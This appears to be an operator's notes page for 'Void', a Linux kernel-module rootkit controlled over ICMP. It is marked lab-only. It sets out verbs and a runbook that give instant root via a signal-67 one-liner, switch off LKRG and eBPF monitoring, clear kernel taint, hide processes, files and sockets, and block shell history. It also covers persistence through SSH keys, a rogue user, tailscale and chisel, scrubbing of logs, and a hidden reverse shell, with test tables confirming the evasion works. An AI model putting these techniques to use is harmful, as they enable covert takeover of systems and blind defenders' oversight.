---
title: "Void LKM injector"
type: tool
tags: [lkm, rootkit, icmp, c2, privesc, exercise]
date_created: 2026-09-14
date_updated: 2026-09-15
sources: []
phase: postex
---

## Core usage

```sh
sudo python3 injector.py 192.168.23.129 --resp          # interactive shell
sudo python3 injector.py 192.168.23.129 --resp 'id'     # one-shot with response sniff
```

Repo: `raw/git/Void` (Encod3d-Sec/Void, lab-only). Operator client is `injector.py` at the repo root; the module lives in `oneshot/`. Since the 2026-09-14 change the module installs **armed**: kill-67 SpawnRoot, the LKRG relax and BPF suppression come up at load, and `.bash_history`/`.zsh_history` are hidden + write-blocked from install. The arm/disarm verbs are overrides from that default; the truth window stays manual. There is no remote "show armed state" verb, so track toggles in the operator log.

## Mental model

The module has two verb families:

- **Runtime toggles** (single 12-byte ICMP window, instant): `root-arm/lkrg-arm/bpf-arm/truth-arm` + their disarms + `taint-clear`. "Arm" = flip a capability switch inside the module. Disarm = flip it back. None of them execute anything on the box by themselves.
- **Chunk verbs** (40-char burst + EOC commit): shell commands (`AUD:`) and file-hide patterns (`PATP:`/`PATM:`).

Session window is 120 s; the client auto-resyncs at 90 s idle. `--resp` sniffs the response burst (ACK exit code + base64 stdout); always run with it in the lab.

## Runtime verbs explained

### root-arm / root-disarm (kill-67 SpawnRoot)

Arms a hook on the kill path. While armed, a process sending itself signal 67 gets all its creds (uid/gid/euid/suid/fsuid + gids) zeroed in place, i.e. instant uid 0, AND its whole tree goes into the pid-hide registry (process, up to 8 ancestors, sibling threads) so `ps` loses it.

```sh
python3 -c 'import os; os.kill(os.getpid(), 67); os.execl("/bin/bash", "bash", "-p")'   # run in the shell you want to elevate
```

- Signal 67 elevates the process that ISSUES the kill (the python process itself); without the exec it exits and nothing persists. Linux has no child-to-parent cred propagation, so a bare `os.kill(os.getpid(), 67)` leaves the parent shell uid 1000 by design.
- The exec form keeps the elevated process alive as your root shell; the whole tree (bash ancestors + sibling threads) vanishes from `ps` at the same moment.
- Why the python form: bash's `kill` builtin rejects signal 67 (> SIGRTMAX) before the syscall ever fires. Anything that issues the raw syscall works.
- `kill -67 <other-pid>` does NOT elevate the target; it hides that pid and swallows the signal.
- `root` is an alias that arms and prints the next move.
- Disarm when finished on the box so a stray 67 from anything else cannot elevate.

### lkrg-arm / lkrg-disarm

LKRG (Linux Kernel Runtime Guard) would detect and kill the SpawnRoot cred commit and hook tampering. This verb locates LKRG's global control struct (`p_ro` symbol), makes its page writable, and zeroes the six validate/enforce knob bytes (saved first; disarm restores them). This is the pre-step when the target runs LKRG: **arm lkrg BEFORE elevating**.

Fail-soft: if `p_ro`/`set_memory_rw` symbols are absent (no LKRG installed, the default on stock Ubuntu) the verb is a no-op, never a crash. Layout drift on an LKRG version it does not recognize also leaves it inert.

### bpf-arm / bpf-disarm

Blue teams watch via eBPF (bpftrace/tetragon/falco-shaped monitors). While armed, hooks on the BPF prog-run path and `bpf_ringbuf_reserve` return nothing for hidden pids: your hidden processes generate zero eBPF events and no ringbuf records. Arm AFTER you have hidden your pids (i.e. after SpawnRoot), and while defenders are actively watching. Fail-soft: if the kernel's prog-run symbols are absent or uninstrumented, it installs nothing. Disarm restores normal BPF for everyone.

### taint-clear

One-shot (not a toggle): zeroes `/proc/sys/kernel/tainted`. Loading any out-of-tree module sets the O taint bit, and taint is the cheapest LKM indicator a defender checks. The module's own syslog filter also drops "taint" lines from dmesg reads, but new taint events re-set the bit (an ftrace warning self-clears in about a second); re-run taint-clear after heavy activity or before a blue-team sweep.

### truth-arm / truth-disarm (the counter-intuitive one)

Opens a window in which the module shows the TRUE kernel to readers of `/proc/kallsyms` and `enabled_functions`, instead of the stock-looking lie. Armed = more visible, deliberately: it exists so the operator (or verify tooling) can confirm hooks are live and count them. Disarmed (default) = foreign readers see a clean kernel. There is NO timeout; the operator closes it.

Rule: arm only around your own verification reads, then disarm immediately.

```sh
# in the injector:  truth-arm, then on the box:
grep -c void /proc/kallsyms ; cat /sys/kernel/debug/tracing/enabled_functions | wc -l
# then truth-disarm
```

### pat add / pat del

Runtime filesystem hiding, and since 2026-09-14 also write-blocking: `pat add <name>` hides any file/dir whose name matches from readdir/getdents, makes stat-family return -ENOENT, and makes `write(2)` to it return -ENOENT. So `ls` and `test -e` lose it, and nothing can append to it. `.bash_history` and `.zsh_history` are built-in patterns from install: shell history never persists (bash flushes by truncate-then-write, so the write fails after the truncate and the file self-wipes each session). Use `pat add` when dropping a new artifact (payload binary, script) after install, without rebuilding; it also protects the artifact against edits. `pat del <name>` unhides and unblocks. Limits: 1-63 chars (module cap 64; oversize is dropped silently, patterns have no ack channel, so verify by listing from a second shell).

## Exercise runbook (low-priv foothold to quiet root)

1. Module is already armed at install (SpawnRoot + LKRG relax + BPF suppression); `root-arm`/`lkrg-arm`/`bpf-arm` only if something disarmed them
2. On box, in the shell to elevate: `python3 -c 'import os; os.kill(os.getpid(), 67); os.execl("/bin/bash", "bash", "-p")'` ; verify `id` = uid 0; the whole tree (this shell + ancestors) is now hidden from ps
3. Persist: `ssh-key-quick` (or `rogue-user` for a login user), or use `tailscale` for an out-of-band channel
4. Drop tooling, then `pat add <each artifact name>` (hides AND write-blocks each artifact)
5. `taint-clear` after install and after any dmesg-noisy activity
6. Verify: `truth-arm` -> read kallsyms/enabled_functions -> `truth-disarm`
7. Going quiet on this box: `root-disarm`, `bpf-disarm`, `lkrg-disarm` (restore defensive state), keep the pid hiding
8. Full teardown on the box: `eject`; a RESIDENT refusal is the designed safe outcome (module stays, disabled and scrubbed, until reboot), do NOT force delete_module after it

## Measured network-hiding matrix (lab 2026-09-14, kernel 7.0.0-31-generic)

Elevated reverse shell (uid 0 via SpawnRoot) from .129 to the keyed session source, nc/bash over TCP 4441, verified from an unkeyed source:

| On-box view | Sees the session? |
|---|---|
| `ps` / /proc walk (registered pids: elevated shell + ancestors) | no (registry) |
| `ps` for processes spawned AFTER elevation | **YES** on the 2026-09-14 build (registry-only filter); SUPERSEDED by the 2026-09-15 lineage-automation build, see the retest table below |
| `ss -tnp` from a foreign (unkeyed) shell | no (lineage walk feeds the socket filters) |
| `/proc/net/tcp` + `tcp6` raw reads | 0 hits (both filtered, not just sock_diag) |
| conntrack (`/proc/net/nf_conntrack`) | 0 hits |
| on-box `tcpdump -i any port <p>` during live traffic | **YES, both directions** (keyed TCP stays tap-visible by design) |

Controls that prove the tools worked: `ss` listed 3 unrelated firefox connections in the same read; the reverse shell answered commands mid-capture.

## Full retest 2026-09-15 (build 0595fe8, fresh install after reboot)

Old module ejected (verdict EJECT:RESIDENT n=12, designed safe terminal), box rebooted, rebuilt via `mk-oneshot.sh` + `oneshot.sh install`. Every test in its own Kali tmux window (`/tmp/void-poc/` on the Kali seat holds the pane captures):

| Test | Result |
|---|---|
| sync + response channel (`--resp`) | ACK exit 0, stdout decoded |
| **Armed-at-install SpawnRoot**: kill-67 exec-form in a fresh shell, ZERO arm verbs ever sent | uid 1000 -> uid 0, prompt flips to root |
| Foreign /proc oracle on elevated pid | `/proc/<pid>` ENOENT, `kill -0` ESRCH, absent from `ps aux` |
| **Automated lineage hiding** (2026-09-15 build): child AND grandchild spawned after elevation, chain intact | `/proc/<pid>` ENOENT, `ps` empty, `kill(pid,0)` ESRCH; control pid 1 visible |
| Orphan / setsid-detached descendant | visible (PPID 1 breaks the ancestry walk; inherent to walk-based hiding, not a bug) |
| Manual pid hide: `python3 -c 'import os; os.kill(<pid>, 67)'` on a live root process | kill returns 0, process keeps running, foreign /proc+ps+kill-0 all blind |
| `.bash_history` write-block (root shell) | append -> `bash: echo: write error: No such file or directory`; ls 0 hits; stat ENOENT |
| `pat add voidmark` write-block | redirect creates empty file, write -> ENOENT, ls 0 hits, stat ENOENT; `cat` still works (open/read not blocked, by design) |
| `pat del voidmark` override | write rc=0, size=9, visible again |
| Reverse shell from hidden session (setsid + /dev/tcp) | caught on 4441, uid 0 roundtrip; `ss`/`/proc/net/tcp`+`tcp6`/conntrack all 0 hits on box; pcap 20 packets both directions (tap-visible by design) |
| `root-disarm` override | kill-67 -> `OSError: [Errno 22] Invalid argument`, uid stays 1000 |
| `root-arm` re-arm | exec-form elevates again in the same shell |

Retest gotchas: backgrounding the reverse payload with plain `&` from the interactive tmux shell left it in state T (job control SIGSTOP); fire it `setsid ... & disown` or via /dev/tcp exec. And a fresh sync from a new operator seat re-keys the channel to that seat only (the hide registry keeps all synced IPs; WSL .1 stayed unkeyed all session after the reboot, which is what made it a valid foreign verifier).

Residuals measured:

- A keyed IP is blind-spotted ENTIRELY: a plain admin ssh from a host that ever synced (WSL .1 in this test) also vanished from ss. A defender who cannot see their own session in ss has a one-glance anomaly; key hygiene matters, sync only from seats you intend to blind-spot.
- Off-box network capture still sees the TCP stream in cleartext (nc/bash plaintext on the wire); wire-shape stealth is the only lever there.
- On-box packet capture SEES the keyed TCP session (clean retest corrected a flawed first capture; matches the source comment "keyed-IP TCP stays visible to taps"). The tpacket drop is ICMP-echo-scoped: on-box taps are blind only to the ICMP channel, not to TCP. Off-box capture reads the stream too, and it is cleartext.
- Do not rely on ss through the backdoor for triage; it is blind to the session you care about.

Raw captures: WSL `/root/void-poc/` (clb, arm, listener transcript, tcpdump), also Kali `/tmp/void-poc/`.

## Keyed-IP rotation (2026-09-15 build 1668b3a)

Every accepted sync adds its source IP to a FIFO capped at 4 seats. A sync from a 5th distinct IP rotates the OLDEST seat out: that IP's sockets become ss-visible again (blind-spot lifted) while the 4 most recent operators stay keyed. The command channel always follows the latest syncer (each injector run syncs first, so any seat can drive the box; a rotated-out seat just syncs to get back in). The box's own new addresses (tailscale 100.x via the inetaddr notifier) take seats too, so a joined victim effectively has 3 external seats. Dedupe keeps repeat syncs seat-neutral; no removal verb; reboot clears.

Lab proof (Kali aliases .200-.203 + injector `--source <ip>`): the victim's own tailscale IP held a seat, so .128+.200+.201+.202 filled the table and the .202 sync evicted .128; A/B in one ss read from the never-syncing WSL .1 showed the .200 TCP session flip visible the instant the .203 sync landed while the .201 session stayed hidden. CLB ACK bursts to an alias seat confirmed under tcpdump. Gotcha: one-shot runs without `--resp` print nothing (no ACK line) - that is the client, not the module.

## Runtime tailscale key (TSKY, build 615be0b)

`tailscale [<key>]` in the interactive shell pushes an inline `tskey-...` via the TSKY chunk verb (same burst shape as a pattern) before TAIL; the module holds it in memory and the join prefers it over the install-time `--tskey` stamp. Keys rotate without reinstall; the join itself is the proof (no ack channel). Verified live: after `tailscale logout` on the victim, one interactive verb re-joined the node to the tailnet with a fresh 100.x address.

## Full retest 2026-09-15 (rotation build 1668b3a, fresh install after reboot)

| Test | Result |
|---|---|
| sync + `id` response channel | ACK exit 0, uid=0 stdout |
| clb one-shot | ACK exit 0 |
| ssh-key-quick + real root login from Kali (`ssh -i /root/.ssh/lkm_ed25519`) | authorized_keys stamped; login uid=0 |
| ssh-key-full + manual restore | PermitRootLogin yes + AuthorizedKeysFile uncommented; restore clean |
| rogue-user / rogue-cleanup | toor uid=1001 + sudo; removed |
| scrub (--resp) | `SCRUB key=1 sshd=0 wtmp=1 btmp=1 logs=1 jrn=1` (71-chunk burst, ACK 0) |
| install-key (interactive) | keypair rewritten, connect hint printed |
| tailscale TSKY re-join after logout | node back on tailnet, new 100.x |
| chisel + chisel-stop | server on 8441, victim connected back, root shell through Kali localhost:2222 (uid=0); stop closed 2222/8441 |
| root-disarm / root-arm | kill-67 EINVAL, then exec-form elevates uid=0 |
| lkrg/bpf arm+disarm, taint-clear | all accepted, tainted=0, module alive (clb ACK) |
| truth-arm / truth-disarm | foreign kallsyms grep: 1 module line vs 0 |
| unhide / hide | lsmod: 1 vs 0 |
| pat-add / pat-del (voidmark) | write ENOENT + invisible; write rc=0 + visible |
| Lineage hiding (main/child/grandchild) | /proc ENOENT, kill -0 ESRCH, ps 0 hits at all 3 depths; control pid visible |
| Manual pid hide (kill-67 on other pid) | rc=0, process alive, foreign /proc+ps+kill-0 blind |
| .bash_history write-block (ubuntu + root) | append fails, ls/stat ENOENT both users |
| Hidden reverse TCP session (elevated) | held on Kali :4441; foreign ss + /proc/net/tcp 0 hits; own ssh control visible |
| **Keyed-IP rotation (A/B)** | .200 session visible + .201 hidden in the same ss read after the 5th distinct sync |
| Eject (normal) | `EJECT:RESIDENT n=4` (designed safe terminal) |
| **Armed-at-install** (fresh install, zero arm verbs) | kill-67 exec-form uid=0 |

Raw captures: Kali `/tmp/void-poc2/` (r-*.txt, e-eject-rot.txt, r-tdp203.txt tcpdump).

## Gotchas

- Injector needs root on the OPERATOR side (raw ICMP socket).
- One command ~= one burst, ids session_id+k; commands cap around 3000 chars (4096-byte reassembly buffer); module caps captured stdout at 1536 bytes per response.
- On-box tcpdump cannot see inbound command pings while a session is live, but the outbound reply bursts are ordinary-looking ICMP; wire-shape stealth is the only network lever.
- `hide`/`unhide` is the lsmod visibility of the module itself (hidden at load by default); unrelated to pid hiding.
- The module is invisible to `lsmod`; only the truth window and a reboot clear everything.

<!-- promoted-slug: void-lkm-injector -->
